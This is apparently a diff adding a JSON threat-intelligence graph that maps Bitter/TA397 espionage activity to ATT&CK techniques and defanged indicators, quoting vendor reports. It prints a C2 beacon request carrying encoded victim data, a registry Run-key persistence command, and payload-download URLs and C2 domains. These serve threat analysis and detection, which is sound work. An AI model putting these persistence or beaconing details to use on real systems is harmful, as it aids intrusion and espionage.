+                "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+              ],
+              [
+                "In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from:\nhxxp://173.254.204[.]72/dune64.log\nHowever, this request returned a 404 error as the attackers had not placed a file with that name on their server – making the rename command and the execution of shh.exe fail."
+              ],
+              [
+                "The email contained a RAR compressed CHM file.",
+                "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1203",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1203",
+        "ttp_id": "T1203",
+        "best_span_sentences_list": [
+          [
+            "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+          ],
+          [
+            "For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager."
+          ],
+          [
+            "The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment.",
+            "When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.",
+            "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office.",
+            "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+          ],
+          [
+            "The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            6,
+            6
+          ],
+          [
+            15,
+            15
+          ],
+          [
+            24,
+            27
+          ],
+          [
+            30,
+            30
+          ]
+        ],
+        "edges": [
+          "EDGE_21fe45ddd4c1",
+          "EDGE_66f0c36df320",
+          "EDGE_68939b03b499",
+          "EDGE_7e201a7f015d",
+          "EDGE_92b4d6bbbf09",
+          "EDGE_aa1e8fdbf6ea",
+          "EDGE_c6fa79b7c2f1",
+          "EDGE_e4a2879e3bec",
+          "EDGE_358bc61df97c",
+          "EDGE_74c70077a235"
+        ],
+        "source": {
+          "TTP:T1203_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                6,
+                6
+              ],
+              [
+                15,
+                15
+              ],
+              [
+                24,
+                27
+              ],
+              [
+                30,
+                30
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+              ],
+              [
+                "For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager."
+              ],
+              [
+                "The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment.",
+                "When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.",
+                "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office.",
+                "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+              ],
+              [
+                "The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802."
+              ]
+            ]
+          },
+          "TTP:T1203_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                9,
+                13
+              ],
+              [
+                16,
+                16
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Beginning on Nov 6, 2018, the URL http://rmmun.org[.]pk/svch was observed hosting two ArtraDownloader files that communicated with the domains info.viewworld71[.]com or hewle.kielsoservice[.]net.",
+                "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload.",
+                "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882.",
+                "This file downloaded a payload that also communicated with the domain hewle.kielsoservice[.]net.",
+                "The other two files hosted on the engineering company’s domain communicated with command and control domain xiovo426[.]net."
+              ],
+              [
+                "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT)."
+              ]
+            ]
+          },
+          "TTP:T1203_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                30,
+                30
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In this campaign, TA397 exploited CVE-2024-43572, otherwise known as GrimResource, which is a vulnerability that provides attackers remote code execution in the context of mmc.exe on targeted endpoints."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1566",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1566",
+        "ttp_id": "T1566",
+        "best_span_sentences_list": [
+          [
+            "This campaign is a typical example of the actor targeting South Asian government entities.",
+            "This campaign targets an elite unit of the Bangladesh's government with a themed lure document alleging to relate to the regular operational tasks in the victim's organization.",
+            "The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)."
+          ],
+          [
+            "The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment.",
+            "When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.",
+            "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office.",
+            "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            2,
+            4
+          ],
+          [
+            24,
+            27
+          ]
+        ],
+        "edges": [
+          "EDGE_126fc6326c89",
+          "EDGE_5bb8261f04ba",
+          "EDGE_d595744fa952",
+          "EDGE_b6c1f21f92f7"
+        ],
+        "source": {
+          "TTP:T1566_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                2,
+                4
+              ],
+              [
+                24,
+                27
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "This campaign is a typical example of the actor targeting South Asian government entities.",
+                "This campaign targets an elite unit of the Bangladesh's government with a themed lure document alleging to relate to the regular operational tasks in the victim's organization.",
+                "The lure document is a spear-phishing email sent to high-ranking officers of the Rapid Action Battalion Unit of the Bangladesh police (RAB)."
+              ],
+              [
+                "The infection chain begins with the spear-phishing email and either a malicious RTF document or an Excel spreadsheet attachment.",
+                "When the victim opens the attachment, it launches the Microsoft Equation Editor application to execute the equations in the form of OLE objects and connects to the hosting server to download and run the payload.",
+                "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office.",
+                "When the victim opens the RTF file with Microsoft Word, it invokes the Equation Editor application and executes the equation formula containing the Return-Oriented Programming (ROP) gadgets."
+              ]
+            ]
+          },
+          "TTP:T1566_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                15,
+                15
+              ],
+              [
+                18,
+                18
+              ],
+              [
+                48,
+                49
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few."
+              ],
+              [
+                "Spearphishing emails remain TA397’s preferred technique for initial access, and to date, we are not aware of any reports indicating the use of alternative methods by this group."
+              ],
+              [
+                "Masquerading as foreign offices, embassies, and government entities of Madagascar, Mauritius and more, indicates that TA397 not only has knowledge of legitimate affairs of those countries, but leverages this knowledge to bolster the legitimacy of its spearphishing operations.",
+                "Moreover, the use of legitimate or spoofed decoy documents, subject lines, and body contents pertaining to internal or foreign government affairs demonstrates that TA397 is very familiar with the standard practices of government."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1583",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1583",
+        "ttp_id": "T1583",
+        "best_span_sentences_list": [
+          [
+            "The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware, which is outlined below."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            18,
+            18
+          ]
+        ],
+        "edges": [
+          "EDGE_22cbea80133f",
+          "EDGE_8452aa4a911e",
+          "EDGE_994d21c1b185",
+          "EDGE_fedf7b0396ad"
+        ],
+        "source": {
+          "TTP:T1583_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": {
+            "best_span_ranges": [
+              [
+                18,
+                18
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware, which is outlined below."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1027",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1027",
+        "ttp_id": "T1027",
+        "best_span_sentences_list": [
+          [
+            "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            33,
+            33
+          ]
+        ],
+        "edges": [
+          "EDGE_d8cf38e8bbb4"
+        ],
+        "source": {
+          "TTP:T1027_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                33,
+                33
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The following example GET request is made to the remote C2 server:\nGET /ourtyaz/qwe.php?TIe=214cf8g5.cgc9.51gb.914d.f17ceg%3ae4cc7*XJO.82GO2QF2BU9*%3aACme%3b%217%2f2%2f8712%21Tfswjdf%21Qbdl%212 HTTP/1.1\nHost: frameworksupport[.]net\nConnection: close\nIn the example request above, the data supplied in the TIe GET variable is separated by a * and the remaining data is encoded by adding one to each byte."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1112",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1112",
+        "ttp_id": "T1112",
+        "best_span_sentences_list": [
+          [
+            "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            29,
+            29
+          ]
+        ],
+        "edges": [
+          "EDGE_7cac4f03c7fa",
+          "EDGE_ad201fb937ce",
+          "EDGE_eb0d34dbd9bb"
+        ],
+        "source": {
+          "TTP:T1112_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                29,
+                29
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1204",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1204",
+        "ttp_id": "T1204",
+        "best_span_sentences_list": [
+          [
+            "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            10,
+            10
+          ]
+        ],
+        "edges": [
+          "EDGE_ba1eb2e151f6",
+          "EDGE_5ff1b80cf3fc"
+        ],
+        "source": {
+          "TTP:T1204_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                10,
+                10
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Between November 2018 and January 2019, an engineering and hydraulics company in Pakistan, almasoodgroup[.]com was observed hosting two AtraDownloader executables as well as a malicious document used to deliver a payload."
+              ]
+            ]
+          },
+          "TTP:T1204_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The email contained a RAR compressed CHM file.",
+                "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1547",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1547",
+        "ttp_id": "T1547",
+        "best_span_sentences_list": [
+          [
+            "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+          ],
+          [
+            "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.",
+            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ],
+          [
+            29,
+            30
+          ]
+        ],
+        "edges": [
+          "EDGE_0071032259a0",
+          "EDGE_469212dfb032",
+          "EDGE_a561e3647032",
+          "EDGE_c1829d996e8d"
+        ],
+        "source": {
+          "TTP:T1547_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ],
+              [
+                29,
+                30
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "Overall, the ArtraDownloader malware family is not sophisticated, leveraging simple registry keys for persistence and HTTP requests to download and execute a remote file."
+              ],
+              [
+                "It creates the following registry if it doesn’t already exist with the intent of persisting on the victim machine:\nHKCU\\Environment\\AppId – c:\\intel\\msdtcv.exe\nArtraDownloader then sets the following registry key to ensure that the malware executes across reboots.",
+                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run – cmd /c start %AppId% && exit\nAdditionally, in a separate thread, the malware will spawn a new process to copy itself to the C:\\intel\\msdtcv.exe path."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1053",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1053",
+        "ttp_id": "T1053",
+        "best_span_sentences_list": [
+          [
+            "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+          ],
+          [
+            "The following example of a scheduled task command line shows how the task beaconed every 16 minutes to the staging domain woodstocktutors[.]com, awaiting instructions to retrieve the next-stage payload."
+          ],
+          [
+            "The email contained a RAR compressed CHM file.",
+            "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            20,
+            20
+          ],
+          [
+            31,
+            31
+          ],
+          [
+            40,
+            41
+          ]
+        ],
+        "edges": [
+          "EDGE_7087b6fde51f",
+          "EDGE_cd00c57dba9b"
+        ],
+        "source": {
+          "TTP:T1053_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                20,
+                20
+              ],
+              [
+                31,
+                31
+              ],
+              [
+                40,
+                41
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "While in 2019/2020, TA397 relied on exploiting CVEs, used ArtraDownloader to deploy additional payloads, and even experimented with Android malware, the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint, Ahnlab, StrikeReady Labs, Cisco Talos, and others."
+              ],
+              [
+                "The following example of a scheduled task command line shows how the task beaconed every 16 minutes to the staging domain woodstocktutors[.]com, awaiting instructions to retrieve the next-stage payload."
+              ],
+              [
+                "The email contained a RAR compressed CHM file.",
+                "If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1078",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1078",
+        "ttp_id": "T1078",
+        "best_span_sentences_list": [
+          [
+            "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ]
+        ],
+        "edges": [
+          "EDGE_0a8c60944aa0",
+          "EDGE_1fe79ec38b79",
+          "EDGE_75b66e947eb2",
+          "EDGE_af8e6cee8033"
+        ],
+        "source": {
+          "TTP:T1078_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                14,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1132",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1132",
+        "ttp_id": "T1132",
+        "best_span_sentences_list": [
+          [
+            "In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            21,
+            21
+          ]
+        ],
+        "edges": [
+          "EDGE_87be49dcbd21",
+          "EDGE_f099790e59fd"
+        ],
+        "source": {
+          "TTP:T1132_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                21,
+                21
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1564",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1564",
+        "ttp_id": "T1564",
+        "best_span_sentences_list": [
+          [
+            "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            24,
+            24
+          ]
+        ],
+        "edges": [
+          "EDGE_1b59d70a09cc"
+        ],
+        "source": {
+          "TTP:T1564_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                24,
+                24
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems, Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files, which allow users to connect with data stored in web services or remote storage locations."
+              ]
+            ]
+          }
+        }
+      },
+      {
+        "node_id": "TTP_T1586",
+        "node_class": "ttp",
+        "node_type": "TTP",
+        "node_text": "TTP:T1586",
+        "ttp_id": "T1586",
+        "best_span_sentences_list": [
+          [
+            "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+          ]
+        ],
+        "best_span_ranges": [
+          [
+            14,
+            14
+          ]
+        ],
+        "edges": [
+          "EDGE_0540d0a634a0",
+          "EDGE_1467211cd877",
+          "EDGE_7efd945b2963",
+          "EDGE_b29e315e3321",
+          "EDGE_ca1d67be25c4",
+          "EDGE_d0e2f0fb242b",
+          "EDGE_fbebc51b9d97"
+        ],
+        "source": {
+          "TTP:T1586_www.proofpoint.com_us_blog_threat-insight_bitter-end-unraveling-eight-years-espionage-antics-part-one": {
+            "best_span_ranges": [
+              [
+                14,
+                14
+              ]
+            ],
+            "best_span_sentences_list": [
+              [
+                "The group has shifted between freemail providers – 163[.]com, 126[.]com, and ProtonMail – and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar."
+              ]
+            ]
+          }
+        }
+      }
+    ],
+    "ioc": [
+      {
+        "node_id": "IOC_07dae82e2b75",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2021-28310",
+        "edges": [
+          "EDGE_92b4d6bbbf09"
+        ],
+        "source": {
+          "CVE-2021-28310_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              15,
+              "For example, in 2021, security researchers discovered that the adversary was exploiting the zero-day vulnerability CVE-2021-28310, a security flaw in Microsoft's Desktop Manager."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2021-28310",
+        "canonical_value": "CVE-2021-28310",
+        "normalized_value": "CVE-2021-28310"
+      },
+      {
+        "node_id": "IOC_313335da0037",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "olmajhnservice[.]com",
+        "edges": [
+          "EDGE_8dd387689786"
+        ],
+        "source": {
+          "olmajhnservice[.]com_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              28,
+              "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx."
+            ]
+          ]
+        },
+        "raw_value": "olmajhnservice[.]com",
+        "canonical_value": "olmajhnservice.com",
+        "normalized_value": "olmajhnservice.com"
+      },
+      {
+        "node_id": "IOC_549a99bb7374",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "C:\\$Utf",
+        "edges": [
+          "EDGE_09565894f2da"
+        ],
+        "source": {
+          "C:\\$Utf_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              29,
+              "The payload is downloaded in the folder \"C:\\$Utf\" created by the shellcode and runs as a process on the victim's machine."
+            ]
+          ]
+        },
+        "raw_value": "C:\\$Utf",
+        "canonical_value": "C:\\$Utf",
+        "normalized_value": "C:\\$Utf"
+      },
+      {
+        "node_id": "IOC_56595d51e494",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2018-0798",
+        "edges": [
+          "EDGE_c6fa79b7c2f1"
+        ],
+        "source": {
+          "CVE-2018-0798_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              6,
+              "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+            ],
+            [
+              30,
+              "The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2018-0798",
+        "canonical_value": "CVE-2018-0798",
+        "normalized_value": "CVE-2018-0798"
+      },
+      {
+        "node_id": "IOC_792cf6811a35",
+        "node_class": "ioc",
+        "node_type": "URL",
+        "node_text": "hxxp[:]//olmajhnservice[.]/nxl/nx",
+        "edges": [
+          "EDGE_6d7260192d42"
+        ],
+        "source": {
+          "hxxp[:]//olmajhnservice[.]/nxl/nx_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              28,
+              "The ROP loads and executes the shell code located at the end of the maldocs in an encrypted format that connects to the malicious host olmajhnservice[.]com and downloads the payload from the URL hxxp[:]//olmajhnservice[.]/nxl/nx."
+            ]
+          ]
+        },
+        "raw_value": "hxxp[:]//olmajhnservice[.]/nxl/nx",
+        "canonical_value": "hxxp://olmajhnservice./nxl/nx",
+        "normalized_value": "hxxp://olmajhnservice./nxl/nx"
+      },
+      {
+        "node_id": "IOC_8162f3bcad5b",
+        "node_class": "ioc",
+        "node_type": "FilePath",
+        "node_text": "%LOCALAPPDATA%\\Debug\\<program name>.exe",
+        "edges": [
+          "EDGE_d54f777ba570"
+        ],
+        "source": {
+          "%LOCALAPPDATA%\\Debug\\<program name>.exe_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              39,
+              "It then saves the file to %LOCALAPPDATA%\\Debug\\<program name>.exe and tries to execute it."
+            ]
+          ]
+        },
+        "raw_value": "%LOCALAPPDATA%\\Debug\\<program name>.exe",
+        "canonical_value": "%LOCALAPPDATA%\\Debug\\<program name>.exe",
+        "normalized_value": "%LOCALAPPDATA%\\Debug\\<program name>.exe"
+      },
+      {
+        "node_id": "IOC_8d216c5c92cf",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "mswsceventlog[.]net",
+        "edges": [
+          "EDGE_fedf7b0396ad"
+        ],
+        "source": {
+          "mswsceventlog[.]net_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              23,
+              "The 99[.]83[.]154[.]118 IP also hosts mswsceventlog[.]net, according to Cisco Umbrella, a domain that was previously reported as Bitter's C2 server in a campaign against Pakistani government organizations."
+            ]
+          ]
+        },
+        "raw_value": "mswsceventlog[.]net",
+        "canonical_value": "mswsceventlog.net",
+        "normalized_value": "mswsceventlog.net"
+      },
+      {
+        "node_id": "IOC_9c59c7073e89",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2017-11882",
+        "edges": [
+          "EDGE_21fe45ddd4c1"
+        ],
+        "source": {
+          "CVE-2017-11882_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              6,
+              "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+            ],
+            [
+              26,
+              "The Malicious RTF document is weaponized to exploit the stack overflow vulnerability CVE-2017-11882, which enables arbitrary code execution on victims' machines running vulnerable versions of Microsoft Office."
+            ]
+          ],
+          "CVE-2017-11882_unit42.paloaltonetworks.com_multiple-artradownloader-variants-used-by-bitter-to-target-pakistan": [
+            [
+              11,
+              "One of the files, Port Details.doc is an RTF document crafted to exploit the EQNEDT vulnerability CVE-2017-11882."
+            ],
+            [
+              16,
+              "This payload is an instance of ArtraDownloader variant 1 exploits CVE-2017-11882 (EQNEDT)."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2017-11882",
+        "canonical_value": "CVE-2017-11882",
+        "normalized_value": "CVE-2017-11882"
+      },
+      {
+        "node_id": "IOC_a45ef11d47a2",
+        "node_class": "ioc",
+        "node_type": "Domain",
+        "node_text": "helpdesk[.]autodefragapp[.]com",
+        "edges": [
+          "EDGE_8452aa4a911e"
+        ],
+        "source": {
+          "helpdesk[.]autodefragapp[.]com_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              18,
+              "The actor's infrastructure consists of the C2 server (helpdesk[.]autodefragapp[.]com) and several domains that host the adversary's malware, which is outlined below."
+            ]
+          ]
+        },
+        "raw_value": "helpdesk[.]autodefragapp[.]com",
+        "canonical_value": "helpdesk.autodefragapp.com",
+        "normalized_value": "helpdesk.autodefragapp.com"
+      },
+      {
+        "node_id": "IOC_c0062b94f744",
+        "node_class": "ioc",
+        "node_type": "CVE",
+        "node_text": "CVE-2018-0802",
+        "edges": [
+          "EDGE_aa1e8fdbf6ea"
+        ],
+        "source": {
+          "CVE-2018-0802_blog.talosintelligence.com_bitter-apt-adds-bangladesh-to-their": [
+            [
+              6,
+              "Once the victim opens the maldoc, the Equation Editor application is automatically launched to run the embedded objects containing the shellcode to exploit known vulnerabilities described by CVE-2017-11882, CVE-2018-0798 and CVE-2018-0802 — all in Microsoft Office — then downloads the trojan from the hosting server and runs it on the victim's machine."
+            ],
+            [
+              30,
+              "The malicious Excel spreadsheet is weaponized to exploit the Microsoft Office memory corruption vulnerabilities CVE-2018-0798 and CVE-2018-0802."
+            ]
+          ]
+        },
+        "raw_value": "CVE-2018-0802",
+        "canonical_value": "CVE-2018-0802",
+        "normalized_value": "CVE-2018-0802"
